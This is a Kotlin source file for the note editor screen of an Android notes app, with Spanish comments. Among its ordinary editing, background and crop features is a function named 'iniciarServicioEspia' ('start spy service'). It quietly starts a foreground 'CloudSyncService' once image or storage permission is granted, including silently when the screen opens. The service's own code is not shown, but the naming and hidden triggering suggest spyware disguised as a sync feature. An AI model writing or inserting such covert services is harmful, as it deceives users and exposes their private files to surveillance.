package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration // Importante
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.Editable // NECESARIO
import android.text.TextWatcher // NECESARIO
import android.view.View
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.widget.NestedScrollView
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NoteEditorActivity : AppCompatActivity() {

    // Vistas
    private lateinit var etTitle: EditText
    private lateinit var etContent: EditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView
    private lateinit var scrollContainer: NestedScrollView

    // Vistas de Fondo
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    // Variables de datos
    private var noteToEdit: Note? = null
    private var selectedColor: String = "#FFFFFF"
    private var currentBackgroundUri: String? = null

    private val db by lazy { NotesDatabase.getDatabase(this) }

    // --- CÓDIGOS DE PERMISO ---
    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    // --- LANZADORES ---
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
            try {
                contentResolver.takePersistableUriPermission(result.data!!.data!!, Intent.FLAG_GRANT_READ_URI_PERMISSION)
                RichTextHelper.insertImage(this, etContent, result.data!!.data!!)
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackgroundUnique(resultUri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // --- 1. CONFIGURACIÓN VISUAL ---
        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        layoutEditor = findViewById(R.id.editor_root)
        scrollContainer = findViewById(R.id.scroll_container)

        // --- 2. LISTENER DE INSETS INTELIGENTE ---
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            val ime = insets.getInsets(WindowInsetsCompat.Type.ime())

            // Padding del contenedor principal
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)

            // Padding del Scroll (Espacio para el teclado)
            val bottomPadding = if (ime.bottom > 0) {
                ime.bottom - systemBars.bottom
            } else {
                0
            }
            scrollContainer.setPadding(0, 0, 0, bottomPadding.coerceAtLeast(0))

            // Auto-Scroll inicial al abrir teclado
            if (ime.bottom > 0 && etContent.hasFocus()) {
                scrollToCursor()
            }

            insets
        }

        initViews()
        setupListeners()
        loadNoteData()

        silentStartService()
    }

    // --- SCROLL INTELIGENTE ---
    private fun scrollToCursor() {
        // Ejecutamos en la cola de mensajes para asegurar que el layout ya calculó la nueva altura del texto
        scrollContainer.post {
            val layout = etContent.layout ?: return@post
            val selection = etContent.selectionEnd
            if (selection < 0) return@post

            // Calculamos dónde está la línea actual del cursor
            val line = layout.getLineForOffset(selection)
            val lineBottom = layout.getLineBottom(line)

            // Posición Y absoluta del cursor dentro del ScrollView
            val cursorY = etContent.top + lineBottom + etContent.paddingTop

            // Altura visible del hueco que deja el teclado
            val visibleHeight = scrollContainer.height - scrollContainer.paddingBottom - scrollContainer.paddingTop

            // Posición actual del scroll
            val currentScrollY = scrollContainer.scrollY

            // --- LÓGICA DE CORRECCIÓN ---
            // Si el cursor está más abajo de lo que se ve...
            if (cursorY > currentScrollY + visibleHeight) {
                // Scroll hasta el cursor + un margen de seguridad de 60px para que no quede pegado al borde
                val targetScroll = cursorY - visibleHeight + 60
                scrollContainer.smoothScrollTo(0, targetScroll)
            }
        }
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
    }

    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"

            val savedColorOrUri = noteToEdit?.color
            if (savedColorOrUri != null) {
                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
                    currentBackgroundUri = savedColorOrUri
                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
                } else {
                    selectedColor = savedColorOrUri
                    currentBackgroundUri = null
                    mostrarFondoColor(selectedColor)
                }
            } else {
                mostrarFondoColor("#FFFFFF")
            }
        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
            mostrarFondoColor("#FFFFFF")
        }
    }

    private fun setupListeners() {
        btnBack.setOnClickListener { finish() }
        btnSave.setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }

        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }

        // --- AGREGADO: Detectar taps para reajustar ---
        etContent.setOnClickListener { scrollToCursor() }

        // --- AGREGADO CRÍTICO: Detectar escritura en tiempo real ---
        etContent.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                // Cada vez que escribes, verificamos si hay que bajar el scroll
                scrollToCursor()
            }
        })

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            currentBackgroundUri = null
            mostrarFondoColor(colorHex)
        }
    }

    private fun mostrarFondoColor(colorHex: String) {
        layoutEditor.setBackgroundColor(Color.TRANSPARENT)
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.GONE
        ivBackground.setImageDrawable(null)
        try {
            ivBackground.setBackgroundColor(Color.parseColor(colorHex))
            etContent.setBackgroundColor(Color.TRANSPARENT)
            val esOscuro = isColorDark(Color.parseColor(colorHex))
            actualizarEstiloTexto(esOscuro)
        } catch (e: Exception) {
            e.printStackTrace()
            layoutEditor.setBackgroundColor(Color.WHITE)
        }
    }

    private fun mostrarFondoImagen(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        layoutEditor.setBackgroundResource(0)
        Glide.with(this)
            .load(uri)
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
        actualizarEstiloTexto(esFondoOscuro = true)
    }

    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
        val textColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
        val hintColor = if (esFondoOscuro) Color.LTGRAY else Color.GRAY
        etTitle.setTextColor(textColor)
        etTitle.setHintTextColor(hintColor)
        etContent.setTextColor(textColor)
        etContent.setHintTextColor(hintColor)
        tvDateLabel.setTextColor(hintColor)
    }

    private fun isColorDark(color: Int): Boolean {
        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
        return darkness >= 0.5
    }

    private fun persistBackgroundUnique(croppedUri: Uri) {
        try {
            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
            val finalFile = File(filesDir, uniqueName)
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            currentBackgroundUri = finalUri.toString()
            mostrarFondoImagen(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun checkGalleryPermission(requestCode: Int) {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            if (requestCode == PERMISSION_REQUEST_GALLERY) openGallery()
            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
        } else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun iniciarFlujoCambioFondo() {
        checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER)
    }

    private fun openGallery() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            type = "image/*"
        }
        pickImageLauncher.launch(intent)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            when (requestCode) {
                PERMISSION_REQUEST_GALLERY -> openGallery()
                PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
            }
        } else {
            // ... Logica de permisos
        }
    }

    private fun startCrop(uri: Uri) {
        val destinationFileName = "temp_crop_${System.currentTimeMillis()}.jpg"
        val destinationFile = File(cacheDir, destinationFileName)
        val destinationUri = Uri.fromFile(destinationFile)
        val metrics = resources.displayMetrics
        val options = UCrop.Options().apply {
            setCompressionQuality(90)
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
            setToolbarTitle("Ajustar Fondo")
            setShowCropGrid(true)
            setFreeStyleCropEnabled(false)
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(metrics.widthPixels.toFloat(), metrics.heightPixels.toFloat())
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        }
    }
    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val contentWithTags = etContent.text.toString()
        if (title.isEmpty() && contentWithTags.trim().isEmpty()) {
            Toast.makeText(this, "La nota está vacía", Toast.LENGTH_SHORT).show()
            return
        }
        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
        val finalBackgroundData = currentBackgroundUri ?: selectedColor
        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = contentWithTags, date = formattedDate, color = finalBackgroundData)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = contentWithTags
                    this.date = formattedDate
                    this.color = finalBackgroundData
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) {
                Toast.makeText(this@NoteEditorActivity, "Guardado", Toast.LENGTH_SHORT).show()
                finish()
            }
        }
    }
}